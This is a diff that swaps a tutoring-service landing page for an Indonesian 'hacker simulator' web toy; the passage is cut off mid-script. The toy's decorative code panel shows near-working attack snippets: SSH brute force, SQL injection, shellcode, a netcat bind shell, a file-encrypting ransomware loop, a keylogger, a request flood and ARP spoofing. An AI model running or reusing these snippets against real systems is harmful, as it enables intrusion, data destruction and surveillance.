@@ -1,209 +1,749 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Layanan Bantu</title>
-  <style>
-    :root {
-      --primary-bg: #0f172a;
-      --secondary-bg: #1e293b;
-      --card-bg: #1a1f2e;
-      --accent-blue: #1e40af;
-      --accent-green: #14532d;
-      --text-color: #f1f5f9;
-      --muted-text: #94a3b8;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYBER HACKER SIMULATOR INDONESIA v3.0</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: var(--primary-bg);
-      color: var(--text-color);
-      transition: 0.3s ease;
-    }
+        body {
+            background: #000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            position: relative;
+        }
 
-    header {
-      background-color: var(--accent-blue);
-      color: #fff;
-      padding: 25px 15px;
-      text-align: center;
-    }
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.15;
+        }
 
-    section {
-      padding: 20px;
-      max-width: 900px;
-      margin: auto;
-    }
+        .main-container {
+            position: relative;
+            z-index: 10;
+            height: 100vh;
+            display: grid;
+            grid-template-columns: 1fr 1fr 300px;
+            grid-template-rows: 80px 1fr 200px;
+            gap: 3px;
+            padding: 3px;
+        }
 
-    .card {
-      padding: 15px;
-      border-radius: 10px;
-      margin-bottom: 15px;
-      background-color: var(--card-bg);
-      color: var(--text-color);
-      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-      opacity: 0;
-      transform: translateY(20px);
-      animation: slideIn 0.5s forwards;
-    }
+        .header {
+            grid-column: 1 / -1;
+            background: linear-gradient(135deg, #001100, #003300, #001100);
+            border: 2px solid #00ff00;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 30px;
+            box-shadow: 0 0 30px #00ff0050, inset 0 0 20px #00330020;
+            position: relative;
+            overflow: hidden;
+        }
 
-    .card:nth-child(2) { animation-delay: 0.2s; }
-    .card:nth-child(3) { animation-delay: 0.4s; }
-    .card:nth-child(4) { animation-delay: 0.6s; }
-    .card:nth-child(5) { animation-delay: 0.8s; }
-    .card:nth-child(6) { animation-delay: 1s; }
-    .card:nth-child(7) { animation-delay: 1.2s; }
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, #00ff0030, transparent);
+            animation: scanline 3s infinite;
+        }
 
-    @keyframes slideIn {
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
+        @keyframes scanline {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
 
-    .wa-button {
-      display: block;
-      background-color: #0f766e;
-      color: white;
-      text-align: center;
-      padding: 14px;
-      border-radius: 8px;
-      text-decoration: none;
-      font-weight: bold;
-      margin: 20px auto;
-      max-width: 320px;
-      transition: 0.3s;
-    }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
+            animation: logoGlow 2s ease-in-out infinite alternate;
+        }
 
-    .wa-button:hover {
-      background-color: #115e59;
-      transform: scale(1.05);
-    }
+        @keyframes logoGlow {
+            from { text-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00; }
+            to { text-shadow: 0 0 30px #00ff00, 0 0 60px #00ff00, 0 0 80px #00ff00; }
+        }
 
-    .form-box {
-      background-color: var(--secondary-bg);
-      padding: 20px;
-      border-radius: 10px;
-      margin-top: 30px;
-    }
+        .status-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            font-size: 12px;
+        }
 
-    input, textarea {
-      width: 100%;
-      padding: 10px;
-      margin-top: 8px;
-      margin-bottom: 15px;
-      background-color: #0f172a;
-      border: 1px solid #334155;
-      border-radius: 6px;
-      color: var(--text-color);
-    }
+        .status-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 3px;
+        }
 
-    input:focus, textarea:focus {
-      outline: none;
-      border-color: var(--accent-blue);
-    }
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #00ff00;
+            animation: pulse 1.5s infinite;
+            box-shadow: 0 0 10px #00ff00;
+        }
 
-    button {
-      background-color: var(--accent-green);
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: 0.3s;
-    }
+        .status-dot.warning { background: #ff6600; box-shadow: 0 0 10px #ff6600; }
+        .status-dot.danger { background: #ff0000; box-shadow: 0 0 10px #ff0000; }
+        .status-dot.info { background: #0088ff; box-shadow: 0 0 10px #0088ff; }
 
-    button:hover {
-      background-color: #166534;
-      transform: scale(1.05);
-    }
+        .terminal {
+            background: linear-gradient(145deg, rgba(0, 20, 0, 0.95), rgba(0, 40, 0, 0.95));
+            border: 2px solid #00ff00;
+            padding: 20px;
+            overflow-y: auto;
+            position: relative;
+            box-shadow: inset 0 0 30px #00ff0020;
+        }
 
-    footer {
-      text-align: center;
-      padding: 15px;
-      background: #0f172a;
-      color: var(--muted-text);
-      margin-top: 30px;
-    }
-  </style>
+        .code-viewer {
+            background: linear-gradient(145deg, rgba(0, 0, 30, 0.95), rgba(0, 0, 50, 0.95));
+            border: 2px solid #0088ff;
+            padding: 20px;
+            overflow-y: auto;
+            color: #0088ff;
+            box-shadow: inset 0 0 30px #0088ff20;
+        }
+
+        .system-monitor {
+            background: linear-gradient(145deg, rgba(30, 0, 0, 0.95), rgba(50, 0, 0, 0.95));
+            border: 2px solid #ff6600;
+            padding: 15px;
+            overflow-y: auto;
+            color: #ff6600;
+            box-shadow: inset 0 0 30px #ff660020;
+        }
+
+        .terminal-header {
+            border-bottom: 2px solid #00ff00;
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+            font-weight: bold;
+            text-align: center;
+            font-size: 14px;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        .terminal-line {
+            margin: 3px 0;
+            animation: typewriter 0.5s;
+            padding: 2px 5px;
+            border-left: 2px solid transparent;
+        }
+
+        .terminal-line.important {
+            border-left-color: #ff6600;
+            background: rgba(255, 102, 0, 0.1);
+        }
+
+        .terminal-line.critical {
+            border-left-color: #ff0000;
+            background: rgba(255, 0, 0, 0.1);
+            animation: blink 1s infinite;
+        }
+
+        .command-panel {
+            grid-column: 1 / -1;
+            background: linear-gradient(145deg, rgba(0, 50, 0, 0.95), rgba(0, 80, 0, 0.95));
+            border: 2px solid #00ff00;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            box-shadow: inset 0 0 30px #00ff0020;
+        }
+
+        .input-section {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .input-line {
+            display: flex;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+        }
+
+        .prompt {
+            color: #ff6600;
+            margin-right: 10px;
+            font-weight: bold;
+            text-shadow: 0 0 5px #ff6600;
+        }
+
+        input {
+            background: transparent;
+            border: none;
+            color: #00ff00;
+            font-family: inherit;
+            font-size: 16px;
+            flex: 1;
+            outline: none;
+        }
+
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+        }
+
+        .tool-btn {
+            background: linear-gradient(135deg, #003300, #006600, #003300);
+            border: 2px solid #00ff00;
+            color: #00ff00;
+            padding: 12px 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: inherit;
+            font-size: 11px;
+            font-weight: bold;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .tool-btn:hover {
+            background: linear-gradient(135deg, #006600, #00aa00, #006600);
+            box-shadow: 0 0 20px #00ff0080;
+            transform: scale(1.05);
+        }
+
+        .tool-btn:active {
+            transform: scale(0.95);
+        }
+
+        .tool-btn.active {
+            background: linear-gradient(135deg, #ff3300, #ff6600, #ff3300);
+            border-color: #ff6600;
+            color: #ffffff;
+            animation: activeGlow 1s infinite alternate;
+        }
+
+        @keyframes activeGlow {
+            from { box-shadow: 0 0 20px #ff660080; }
+            to { box-shadow: 0 0 40px #ff6600; }
+        }
+
+        .advanced-tools {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .advanced-btn {
+            background: linear-gradient(135deg, #330000, #660000, #330000);
+            border: 1px solid #ff0000;
+            color: #ff0000;
+            padding: 8px 5px;
+            cursor: pointer;
+            font-size: 10px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .advanced-btn:hover {
+            background: linear-gradient(135deg, #660000, #aa0000, #660000);
+            box-shadow: 0 0 15px #ff000080;
+        }
+
+        .progress-container {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #001100;
+            border: 1px solid #00ff00;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff00, #88ff88, #00ff00);
+            width: 0%;
+            transition: width 0.2s;
+            box-shadow: 0 0 15px #00ff00;
+            position: relative;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: progressShine 2s infinite;
+        }
+
+        @keyframes progressShine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .stats-display {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            font-size: 11px;
+        }
+
+        .stat-item {
+            text-align: center;
+            padding: 5px;
+            border: 1px solid #00ff0040;
+            background: rgba(0, 255, 0, 0.05);
+        }
+
+        .glitch {
+            animation: glitch 0.5s infinite;
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0); filter: hue-rotate(0deg); }
+            10% { transform: translate(-2px, 2px); filter: hue-rotate(90deg); }
+            20% { transform: translate(-2px, -2px); filter: hue-rotate(180deg); }
+            30% { transform: translate(2px, 2px); filter: hue-rotate(270deg); }
+            40% { transform: translate(2px, -2px); filter: hue-rotate(360deg); }
+            50% { transform: translate(-2px, 2px); filter: hue-rotate(90deg); }
+            60% { transform: translate(-2px, -2px); filter: hue-rotate(180deg); }
+            70% { transform: translate(2px, 2px); filter: hue-rotate(270deg); }
+            80% { transform: translate(-2px, -2px); filter: hue-rotate(360deg); }
+            90% { transform: translate(2px, 2px); filter: hue-rotate(90deg); }
+            100% { transform: translate(0); filter: hue-rotate(0deg); }
+        }
+
+        .warning { color: #ff6600; text-shadow: 0 0 10px #ff6600; }
+        .danger { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
+        .success { color: #00ff88; text-shadow: 0 0 10px #00ff88; }
+        .info { color: #0088ff; text-shadow: 0 0 10px #0088ff; }
+
+        .monitor-item {
+            margin: 8px 0;
+            padding: 8px;
+            border-left: 3px solid #ff6600;
+            background: rgba(255, 102, 0, 0.1);
+            font-size: 11px;
+        }
+
+        .popup-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #001100, #003300);
+            border: 2px solid #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 0 30px #00ff0080;
+            z-index: 1000;
+            transform: translateX(400px);
+            transition: transform 0.5s;
+        }
+
+        .popup-notification.show {
+            transform: translateX(0);
+        }
+
+        .typing-indicator {
+            display: inline-block;
+            width: 4px;
+            height: 16px;
+            background: #00ff00;
+            animation: typing 1s infinite;
+        }
+
+        @keyframes typing {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+    </style>
 </head>
 <body>
-  <header>
-    <h1>Chat Parel</h1>
-    <p>Solusi Cerdas untuk Tugas, Proyek, dan Eksperimenmu</p>
-  </header>
+    <canvas class="matrix-bg" id="matrix"></canvas>
+    
+    <div class="main-container">
+        <div class="header">
+            <div class="logo">🔥 CYBER HACKER SIMULATOR INDONESIA v3.0 🔥</div>
+            <div class="status-grid">
+                <div class="status-item">
+                    <div class="status-dot" id="connection-status"></div>
+                    <span>KONEKSI</span>
+                </div>
+                <div class="status-item">
+                    <div class="status-dot warning" id="target-status"></div>
+                    <span id="target-ip">192.168.1.1</span>
+                </div>
+                <div class="status-item">
+                    <div class="status-dot danger" id="access-status"></div>
+                    <span id="access-level">ROOT</span>
+                </div>
+                <div class="status-item">
+                    <div class="status-dot info" id="security-status"></div>
+                    <span>BYPASSED</span>
+                </div>
+            </div>
+        </div>
 
-  <section>
-    <a href="https://wa.me/6282145545119" target="_blank" class="wa-button">Chat WhatsApp Sekarang</a>
+        <div class="terminal">
+            <div class="terminal-header">📺 TERMINAL SISTEM - SESI AKTIF</div>
+            <div id="terminal-content">
+                <div class="terminal-line success">[SISTEM] Memulai enkripsi quantum bypass...</div>
+                <div class="terminal-line warning">[NEURAL] Loading algoritma neural network...</div>
+                <div class="terminal-line info">[KONEKSI] Membuat koneksi aman ke server...</div>
+                <div class="terminal-line success">[SUKSES] Sistem siap untuk infiltrasi!</div>
+                <div class="terminal-line important">[PERINGATAN] Akses administrator diperoleh!</div>
+            </div>
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress"></div>
+                </div>
+                <div class="stats-display">
+                    <div class="stat-item">
+                        <div>PACKETS</div>
+                        <div id="packet-count">0</div>
+                    </div>
+                    <div class="stat-item">
+                        <div>BREACHED</div>
+                        <div id="breach-count">0</div>
+                    </div>
+                    <div class="stat-item">
+                        <div>CRYPTO</div>
+                        <div id="crypto-count">0.00</div>
+                    </div>
+                </div>
+            </div>
+        </div>
 
-    <div class="card">
-      <h3>Tugas Pemrograman</h3>
-      <p>Bantu tugas C++, Java, HTML, dan lainnya. Cocok untuk pelajar & mahasiswa.</p>
+        <div class="code-viewer">
+            <div class="terminal-header" style="color: #0088ff; border-color: #0088ff;">💻 LIVE CODE STREAM</div>
+            <div id="code-content"></div>
+        </div>
+
+        <div class="system-monitor">
+            <div class="terminal-header" style="color: #ff6600; border-color: #ff6600;">🚨 MONITOR SISTEM</div>
+            <div id="monitor-content">
+                <div class="monitor-item">FIREWALL: Dinonaktifkan</div>
+                <div class="monitor-item">ANTIVIRUS: Dibypas</div>
+                <div class="monitor-item">ADMIN PANEL: Diakses</div>
+            </div>
+        </div>
+
+        <div class="command-panel">
+            <div class="input-section">
+                <div class="input-line">
+                    <span class="prompt">hacker@indo:~$</span>
+                    <input type="text" id="command-input" placeholder="Masukkan perintah..." autocomplete="off">
+                    <span class="typing-indicator"></span>
+                </div>
+            </div>
+            
+            <div class="tools-grid">
+                <button class="tool-btn" onclick="runTool('portscan')">🔍 SCAN PORT</button>
+                <button class="tool-btn" onclick="runTool('bruteforce')">🔨 BRUTE FORCE</button>
+                <button class="tool-btn" onclick="runTool('sqlinjection')">💉 SQL INJECT</button>
+                <button class="tool-btn" onclick="runTool('cryptomine')">⛏️ CRYPTO MINE</button>
+                <button class="tool-btn" onclick="runTool('networkmap')">🗺️ PETA JARINGAN</button>
+                <button class="tool-btn" onclick="runTool('firewall')">🛡️ BYPASS FIREWALL</button>
+                <button class="tool-btn" onclick="runTool('ddos')">⚡ DDoS ATTACK</button>
+                <button class="tool-btn" onclick="runTool('keylogger')">⌨️ KEYLOGGER</button>
+            </div>
+
+            <div class="advanced-tools">
+                <button class="advanced-btn" onclick="runAdvanced('ransomware')">🦠 RANSOMWARE</button>
+                <button class="advanced-btn" onclick="runAdvanced('backdoor')">🚪 BACKDOOR</button>
+                <button class="advanced-btn" onclick="runAdvanced('botnet')">🤖 BOTNET</button>
+                <button class="advanced-btn" onclick="runAdvanced('rootkit')">👻 ROOTKIT</button>
+                <button class="advanced-btn" onclick="runAdvanced('phishing')">🎣 PHISHING</button>
+                <button class="advanced-btn" onclick="runAdvanced('exploit')">💥 ZERO-DAY</button>
+            </div>
+        </div>
     </div>
 
-    <div class="card">
-      <h3>Robotika & Mikrokontroler</h3>
-      <p>Proyek robotik dari sensor sampai sistem kendali, Arduino, ESP, dan lainnya.</p>
+    <div class="popup-notification" id="notification">
+        <div id="notification-content"></div>
     </div>
 
-    <div class="card">
-      <h3>Elektronika Dasar</h3>
-      <p>Belajar komponen, eksperimen rangkaian, sampai paham praktiknya.</p>
-    </div>
+    <script>
+        // Enhanced Matrix effect
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
 
-    <div class="card">
-      <h3>IoT & Arduino</h3>
-      <p>Panduan proyek IoT, Arduino Uno, ESP32, sensor & aktuator, MQTT, Blynk, dsb.</p>
-    </div>
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
 
-    <div class="card">
-      <h3>Sewa Modul Mikrokontroler</h3>
-      <p>Arduino Uno, NodeMCU ESP8266/ESP32, sensor DHT, Ultrasonik, Relay, OLED, LoRa, dll.</p>
-    </div>
+        const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`";
+        const matrixArray = matrix.split("");
 
-    <div class="card">
-      <h3>Testimoni Klien</h3>
-      <p><strong>Bayu:</strong> "Penjelasannya enak & gampang mengerti deh"<br>
-         <strong>Diva:</strong> "Bisa konsultasi langsung, Murah buangett!"</p>
-    </div>
+        const fontSize = 12;
+        const columns = canvas.width / fontSize;
 
-    <div class="card">
-      <h3>Portofolio Proyek</h3>
-      <ul>
-        <li>Smart Trash Bin (Arduino + Ultrasonik)</li>
-        <li>Sistem Chat LoRa Jarak Jauh</li>
-        <li>Prototipe Kendali Lampu IoT</li>
-      </ul>
-    </div>
+        const drops = [];
+        const colors = ['#00ff00', '#0088ff', '#ff6600', '#ff0000'];
 
-<div class="form-box">
-  <h3>Form Pemesanan Cepat</h3>
-  <form onsubmit="kirimWA(event)">
-    <input type="text" id="nama" placeholder="Nama kamu" required />
-    <input type="text" id="wilayah" placeholder="Wilayah (contoh: Bali, Amlapura)" required />
-    <textarea id="keperluan" rows="4" placeholder="Tulis kebutuhanmu..." required></textarea>
-    <button type="submit">Kirim ke WhatsApp</button>
-  </form>
-</div>
+        for(let x = 0; x < columns; x++) {
+            drops[x] = Math.random() * -100;
+        }
 
-<script>
-  function kirimWA(event) {
-    event.preventDefault();
-    const nama = document.getElementById("nama").value.trim();
-    const wilayah = document.getElementById("wilayah").value.trim();
-    const keperluan = document.getElementById("keperluan").value.trim();
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.font = fontSize + 'px Courier New';
+            
+            for(let i = 0; i < drops.length; i++) {
+                const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
+                const colorIndex = Math.floor(Math.random() * colors.length);
+                ctx.fillStyle = colors[colorIndex];
+                
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
 
-    const pesan = `Halo, Saya ${nama} dari ${wilayah} ingin ${keperluan}`;
-const url = `https://wa.me/6282145545119?text=${encodeURIComponent(pesan)}`;
-window.location.href = url;
-  }
-</script>
-  </section>
+        setInterval(drawMatrix, 40);
 
-  <footer>
-    <p>&copy; 2025 Parel Projects | Powered by Otak dan Kopi</p>
-  </footer>
-</body>
-</html>
+        // Enhanced terminal functionality
+        const terminalContent = document.getElementById('terminal-content');
+        const codeContent = document.getElementById('code-content');
+        const monitorContent = document.getElementById('monitor-content');
+        const commandInput = document.getElementById('command-input');
+        const progressBar = document.getElementById('progress');
+
+        const hackingCommands = {
+            'help': 'Perintah tersedia: scan, crack, inject, mine, map, bypass, access, status, exploit, payload',
+            'scan': 'Memindai jaringan target...',
+            'crack': 'Memulai sequence cracking password...',
+            'inject': 'Menyebarkan payload SQL injection...',
+            'mine': 'Memulai operasi penambangan cryptocurrency...',
+            'map': 'Memetakan topologi jaringan...',
+            'bypass': 'Membypass protokol keamanan...',
+            'access': 'Mendapatkan akses root...',
+            'status': 'Status sistem: DIKOMPROMIKAN - Level Akses: ADMIN',
+            'exploit': 'Mengeksploitasi celah keamanan...',
+            'payload': 'Menyiapkan payload berbahaya...',
+            'trojan': 'Menanamkan trojan horse...',
+            'worm': 'Menyebarkan network worm...',
+            'virus': 'Menginfeksi sistem dengan virus...',
+            'malware': 'Menginstal malware pada target...',
+            'spyware': 'Mengaktifkan spyware untuk monitoring...',
+            'adware': 'Menyuntikkan adware ke browser...',
+            'logbomb': 'Menanamkan logic bomb...',
+            'timebomb': 'Mengatur time bomb...',
+            'destroy': 'Menghancurkan log sistem...',
+            'wipe': 'Menghapus jejak digital...'
+        };
+
+        const codeSnippets = [
+            `import socket, hashlib, threading
+def brute_force_ssh(target_ip, username, password_list):
+    for password in password_list:
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.connect(target_ip, username=username, password=password)
+            print(f"[SUKSES] Password ditemukan: {password}")
+            return password
+        except:
+            continue`,
+            
+            `SELECT * FROM users WHERE username='admin' AND password=''; DROP TABLE users; --`,
+            
+            `void buffer_overflow_exploit() {
+    char shellcode[] = "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80";
+    char buffer[256];
+    memcpy(buffer, shellcode, sizeof(shellcode));
+    ((void(*)())buffer)();
+}`,
+            
+            `nmap -sS -sV -O -A -p- --script vuln 192.168.1.0/24
+# Scanning untuk vulnerabilities...
+# Port 22/tcp open ssh OpenSSH 7.4 (protocol 2.0)
+# Port 80/tcp open http Apache httpd 2.4.6
+# Port 443/tcp open ssl/http Apache httpd 2.4.6`,
+            
+            `function create_backdoor() {
+    const payload = btoa("nc -lvp 4444 -e /bin/bash");
+    const script = document.createElement('script');
+    script.src = 'data:text/javascript;base64,' + payload;
+    document.head.appendChild(script);
+    console.log("[BACKDOOR] Akses jarak jauh berhasil dibuat");
+}`,
+            
+            `import requests, json
+def sql_injection_attack(url, payload):
+    data = {"username": f"admin' OR 1=1 --", "password": "anything"}
+    response = requests.post(url + "/login", data=data)
+    if "welcome" in response.text.lower():
+        print("[BERHASIL] SQL Injection sukses!")
+        return True
+    return False`,
+            
+            `#!/bin/bash
+# Ransomware Script - HANYA UNTUK SIMULASI
+encrypt_files() {
+    find /home -type f -name "*.txt" -o -name "*.doc" -o -name "*.pdf" | while read file; do
+        openssl enc -aes-256-cbc -salt -in "$file" -out "$file.encrypted" -k "hackerpayload2024"
+        rm "$file"
+        echo "File $file telah dienkripsi!"
+    done
+}`,
+            
+            `import psutil, keylogger, time
+class AdvancedKeylogger:
+    def __init__(self):
+        self.log_file = "/tmp/.hidden_keylog"
+        self.is_active = True
+    
+    def capture_keystrokes(self):
+        while self.is_active:
+            event = keyboard.read_event()
+            if event.event_type == keyboard.KEY_DOWN:
+                self.log_keystroke(event.name)
+                time.sleep(0.01)`,
+            
+            `function ddos_attack(target_url, threads=1000) {
+    const requests = [];
+    for(let i = 0; i < threads; i++) {
+        requests.push(
+            fetch(target_url, {
+                method: 'POST',
+                body: 'A'.repeat(10000),
+                mode: 'no-cors'
+            }).catch(() => {})
+        );
+    }
+    Promise.all(requests).then(() => console.log("DDoS attack selesai"));
+}`,
+            
+            `import scapy.all as scapy
+def arp_spoof(target_ip, gateway_ip):
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
+    
+    while True:
+        # Spoof target
+        packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+        # Spoof gateway
+        packet2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+        
+        scapy.send(packet1, verbose=False)
+        scapy.send(packet2, verbose=False)
+        time.sleep(2)`
+        ];
+
+        let terminalLines = 0;
+        let isHacking = false;
+        let packetCount = 0;
+        let breachCount = 0;
+        let cryptoCount = 0;
+
+        function showNotification(message, type = 'success') {
+            const notification = document.getElementById('notification');
+            const content = document.getElementById('notification-content');
+            
+            content.innerHTML = `<div class="${type}">${message}</div>`;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 4000);
+        }
+
+        function addTerminalLine(text, className = '') {
+            const line = document.createElement('div');
+            line.className = `terminal-line ${className}`;
+            line.textContent = text;
+            terminalContent.appendChild(line);
+            terminalContent.scrollTop = terminalContent.scrollHeight;
+            terminalLines++;
+            
+            if (terminalLines > 25) {
+                terminalContent.removeChild(terminalContent.firstChild);
+                terminalLines--;
+            }
+        }
+
+        function addCodeSnippet() {
+            const snippet = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
+            const codeBlock = document.createElement('div');
+            codeBlock.innerHTML = snippet.replace(/\n/g, '<br>');
+            codeBlock.style.marginBottom = '15px';
+            codeBlock.style.padding = '10px';
+            codeBlock.style.border = '1px solid #0088ff40';
+            codeBlock.style.borderRadius = '3px';
+            codeBlock.style.fontSize = '11px';
+            codeContent.appendChild(codeBlock);
+            codeContent.scrollTop = codeContent.scrollHeight;
+            
+            // Limit code blocks
+            if (codeContent.children.length > 8) {
+                codeContent.removeChild(codeContent.firstChild);
+            }
+        }
+
+        function addMonitorItem(text, className = '') {
+            const item = document.createElement('div');
+            item.className = `monitor-item ${className}`;
+            item.textContent = text;
+            monitorContent.appendChild(item);
+            monitorContent.scrollTop = monitorContent.scrollHeight;
+            
+            if (monitorContent.children.length > 10) {
+                monitorContent.removeChild(monitorContent.firstChild);
+            }
+        }
+
+        function updateStats() {
+            packetCount += Math.floor(Math.random() * 50) + 10;
+            breachCount += Math.floor(Math.random() * 3);
+            cryptoCount += Math.random() * 0.01;
+            
+            document.getElementById('packet-count').textContent = packetCount;
+            document.getElementById('breach-count').textContent = breachCount;
+            document.getElementById('crypto-count').textContent = cryptoCount.toFixed(3);
+        }
+
+        function simulateProgress(duration, callback) {
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 15 + 5;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    if (callback) callback();
+                }
+                progressBar.style.width =
